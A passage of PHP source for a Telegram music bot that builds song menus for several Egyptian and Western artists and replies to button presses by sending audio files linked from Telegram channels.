 audio =>"https://t.me/mahmoumagdx/74",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/77",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/75",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/76",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/73",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diab14"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/556",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab15"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/558",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab16"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/559",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab17"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/560",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab18"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/557",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني محمد سعيد 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'يا ويلي 🎧','callback_data'=>"sidoo1"],['text'=>'جواكي 🎧','callback_data'=>"sidoo2"]],
[['text'=>'لو 🎧','callback_data'=>"sidoo3"],['text'=>'متغير 🎧','callback_data'=>"sidoo4"]],
[['text'=>'بيني وبينك🎧','callback_data'=>"sidoo5"],['text'=>'مش بحكي 🎧','callback_data'=>"sidoo6"]],
[['text'=>'وحدي لكن 🎧','callback_data'=>"sidoo7"],['text'=>'مفيش بديل 🎧','callback_data'=>"sidoo8"]],
[['text'=>'يامي 🎧','callback_data'=>"sidoo9"],['text'=>'راجعه تاني ليه 🎧','callback_data'=>"sidoo10"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="sidoo1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/63",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/53",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/52",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/54",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/55",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/56",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sidoo7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/57",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/58",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sidoo9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/59",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sidoo10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/60",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="afrt" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني عفروتو 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'بكار 🎧','callback_data'=>"afrt1"],['text'=>'احمد علي اسم جدو 🎧','callback_data'=>"afrt2"]],
[['text'=>'سجاره 🎧','callback_data'=>"afrt3"],['text'=>'خربت 🎧','callback_data'=>"afrt4"]],
[['text'=>'كوتش اديداس🎧','callback_data'=>"afrt5"],['text'=>'ناميجا 🎧','callback_data'=>"afrt6"]],
[['text'=>'مين دول يلا 🎧','callback_data'=>"afrt7"],['text'=>'حبك مات 🎧','callback_data'=>"afrt8"]],
[['text'=>'بس الا بارد 🎧','callback_data'=>"afrt9"],['text'=>'انتو اعدائي 🎧','callback_data'=>"afrt10"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="afrt1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/124",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/125",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/126",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/127",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/128",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/129",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/130",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/131",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="afrt9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/132",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="afrt10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/561",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ويجز 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'علي راحتي 🎧','callback_data'=>"wegz1"],['text'=>'الغساله🎧','callback_data'=>"wegz2"]],
[['text'=>'كده كده 🎧','callback_data'=>"wegz3"],['text'=>'باظت 🎧','callback_data'=>"wegz4"]],
[['text'=>'مش هقولك بيبي🎧','callback_data'=>"wegz5"],['text'=>'لقطه 🎧','callback_data'=>"wegz6"]],
[['text'=>'منحوس 🎧','callback_data'=>"wegz7"],['text'=>'دورك جاي 🎧','callback_data'=>"wegz8"]],
[['text'=>'واحد وعشرين 🎧','callback_data'=>"wegz9"],['text'=>'اخربان 🎧','callback_data'=>"wegz10"]],
[['text'=>'سالكه 🎧','callback_data'=>"wegz11"],['text'=>'بالسلامه 🎧','callback_data'=>"wegz12"]],
[['text'=>'اسياد البلد 🎧','callback_data'=>"wegz13"],['text'=>'علي راحتي 🎧','callback_data'=>"wegz14"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="wegz" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ويجز 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'علي راحتي 🎧','callback_data'=>"wegz1"],['text'=>'الغساله🎧','callback_data'=>"wegz2"]],
[['text'=>'كده كده 🎧','callback_data'=>"wegz3"],['text'=>'باظت 🎧','callback_data'=>"wegz4"]],
[['text'=>'مش هقولك بيبي🎧','callback_data'=>"wegz5"],['text'=>'لقطه 🎧','callback_data'=>"wegz6"]],
[['text'=>'منحوس 🎧','callback_data'=>"wegz7"],['text'=>'دورك جاي 🎧','callback_data'=>"wegz8"]],
[['text'=>'واحد وعشرين 🎧','callback_data'=>"wegz9"],['text'=>'اخربان 🎧','callback_data'=>"wegz10"]],
[['text'=>'سالكه 🎧','callback_data'=>"wegz11"],['text'=>'بالسلامه 🎧','callback_data'=>"wegz12"]],
[['text'=>'اسياد البلد 🎧','callback_data'=>"wegz13"],['text'=>'علي راحتي 🎧','callback_data'=>"wegz14"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}



if($data=="wegz1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/12",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/3",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/6",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/8",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/9",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/7",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wegz7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/10",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/5",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/4",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/11",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/294",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/292",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/299",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wegz14"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/miiaaqp/297",
  'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="bablo" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني بابلو 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'اتاري 🎧','callback_data'=>"bablo1"],['text'=>'سكانيا🎧','callback_data'=>"bablo2"]],
[['text'=>'افتر بارتي🎧','callback_data'=>"bablo3"],['text'=>'فري 🎧','callback_data'=>"bablo4"]],
[['text'=>'سندباد🎧','callback_data'=>"bablo5"],['text'=>'ابو مكه 🎧','callback_data'=>"bablo6"]],
[['text'=>'فولكلور 🎧','callback_data'=>"bablo7"],['text'=>'ديناميت 🎧','callback_data'=>"bablo8"]],
[['text'=>'الجميزه 🎧','callback_data'=>"bablo9"]],
[['text'=>'𝖇??𝖈𝖐 🎧','callback_data'=>"song1"]],
]
])
]);
}


if($data=="bablo1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/28",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/29",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/30",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/31",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/32",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/33",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bablo7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/34",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/35",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bablo9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/36",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني مروان موسي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'نهايه العالم 🎧','callback_data'=>"maro1"],['text'=>'فرعون 🎧','callback_data'=>"maro2"]],
[['text'=>'البوصله ضاعت 🎧','callback_data'=>"maro3"],['text'=>'النظام 🎧','callback_data'=>"maro4"]],
[['text'=>'خربت 🎧','callback_data'=>"maro5"],['text'=>'ابطال 🎧','callback_data'=>"maro6"]],
[['text'=>'نجوم باريس 🎧','callback_data'=>"maro7"],['text'=>'شيراتون 🎧','callback_data'=>"maro8"]],
[['text'=>'شهر اتناشر  🎧','callback_data'=>"maro9"],['text'=>'شطائر 🎧','callback_data'=>"maro10"]],
[['text'=>'تاتش 🎧','callback_data'=>"maro11"],['text'=>'فرصه 🎧','callback_data'=>"maro12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="maro1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/38",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/39",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/40",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/41",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/42",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/43",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="maro7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/44",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/45",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/46",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="maro10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/47",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="maro11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/48",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maro12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/49",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="song2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝗨𝐑 𝐒𝐎𝐍𝐆 𖢙
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝒋𝒖𝒔𝒕𝒊𝒏𝒆 𝒃𝒊𝒃𝒆𝒓 🎧','callback_data'=>"justb"],['text'=>'𝒕𝒉𝒆 𝒄𝒉𝒂𝒊𝒏𝒔𝒎𝒐𝒌𝒆𝒓𝒔 🎧','callback_data'=>"thsm"]],
[['text'=>'𝒎𝒂𝒓𝒐𝒐𝒏 5  🎧','callback_data'=>"maarroon"],['text'=>'𝒃𝒊𝒍𝒍𝒊 𝒆𝒊𝒍𝒊𝒔𝒉  🎧','callback_data'=>"ellla"]],
[['text'=>'𝒔𝒊𝒂 🎧','callback_data'=>"siax"],['text'=>'𝒊𝒎𝒂𝒈𝒊𝒏𝒆 𝒅𝒓𝒂𝒈𝒐𝒏𝒔  🎧','callback_data'=>"dragons"]],
[['text'=>'𝒆𝒅 𝒔𝒉𝒆𝒆𝒓𝒂𝒏 🎧','callback_data'=>"shern"],['text'=>'𝒄𝒉𝒂𝒓𝒍𝒊𝒆 𝒑𝒖𝒕𝒉 🎧','callback_data'=>"puth"]],
[['text'=>'𝒑𝒐𝒔𝒕 𝒎𝒂𝒍𝒐𝒏𝒆 🎧','callback_data'=>"mallon"],['text'=>'𝒉𝒂𝒍𝒔𝒆𝒚 🎧','callback_data'=>"hesel"]],
[['text'=>'𝒕𝒂𝒚𝒍𝒐𝒓 𝒔𝒘𝒊𝒇𝒕  🎧','callback_data'=>"swift"],['text'=>'𝒃𝒆𝒃𝒆 𝒓𝒆𝒙𝒉𝒂 🎧','callback_data'=>"rexo"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song"]],
]
])
]);
}
if($data=="rexo" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩  𝙱𝙴𝙱𝙴 𝚁𝙴𝚇𝙷𝙰  𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙸 𝙶𝙾𝚃 𝚈𝙾𝚄 🎵','callback_data'=>"rexo1"]],
[['text'=>'𝙸𝙼 𝙰 𝙼𝙴𝚂𝚂  🎵','callback_data'=>"rexo2"]],
[['text'=>'𝚂𝙰𝚈 𝙼𝚈 𝙽𝙰𝙼𝙴 🎵','callback_data'=>"rexo3"]],
[['text'=>'𝙼𝙴𝙰𝙽𝚃 𝚃𝙾 𝙱𝙴 🎵','callback_data'=>"rexo4"]],
[['text'=>'𝙸𝙽 𝙽𝙰𝙼𝙴 𝙾𝙵 𝙻𝙾𝚅𝙴 🎵','callback_data'=>"rexo5"]],
[['text'=>'𝙷𝙰𝚁𝙳𝙴𝚁  🎵','callback_data'=>"rexo6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}


if($data=="rexo1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/698",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rexo2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/699",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rexo3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/700",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rexo4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/701",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rexo5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/702",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rexo6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/703",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="swift" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝚃𝙰𝚈𝙻𝙾𝚁 𝚂𝚆𝙸𝙵𝚃  𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙱𝙻𝙰??𝙺 𝚂𝙿𝙰𝙲𝙴 🎵','callback_data'=>"swift1"]],
[['text'=>'𝙲𝙰𝚁𝙳𝙸𝙶𝙰𝙽  🎵','callback_data'=>"swift2"]],
[['text'=>'𝙳𝙴𝙻𝙸𝙲𝙰𝚃𝙴 🎵','callback_data'=>"swift3"]],
[['text'=>'𝙻𝙾𝙾𝙺 𝚆𝙷𝙰𝚃 𝚈𝙾𝚄 𝙼𝙰𝙳𝙴 𝙼𝙴 𝙳𝙾 🎵','callback_data'=>"swift4"]],
[['text'=>'𝙴𝚇𝙸𝙻𝙴 🎵','callback_data'=>"swift5"]],
[['text'=>'𝚈𝙾𝚄 𝙱𝙴𝙻𝙾𝙽𝙶 𝚆𝙸𝚃𝙷 𝙼𝙴  🎵','callback_data'=>"swift6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}
 

if($data=="swift1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/691",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="swift2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/692",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="swift3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/693",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="swift4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/694",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="swift5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/695",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="swift6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/696",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mallon" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙿??𝚂𝚃 𝙼𝙰𝙻𝙾𝙽𝙴 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙲𝙸𝚁𝙲𝙻𝙴𝚂 🎵','callback_data'=>"mallon1"]],
[['text'=>'𝚁𝙾𝙲𝙺𝚂𝚃𝙰𝚁  🎵','callback_data'=>"mallon2"]],
[['text'=>'𝙶𝙾𝙾𝙳𝙱𝚈𝙴𝚂 🎵','callback_data'=>"mallon3"]],
[['text'=>'𝙲𝙾𝙽𝙶𝚁𝙰𝚃𝚄𝙻𝙰𝚃𝙸𝙾𝙽𝚂 🎵','callback_data'=>"mallon4"]],
[['text'=>'𝚂𝚄𝙽 𝙵𝙻𝙾𝚆𝙴𝚁 🎵','callback_data'=>"mallon5"]],
[['text'=>'𝚆𝙾𝚆  🎵','callback_data'=>"mallon6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="mallon1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/623",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mallon2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/624",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mallon3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/625",
 'caption'=>"by : @wizard_system",
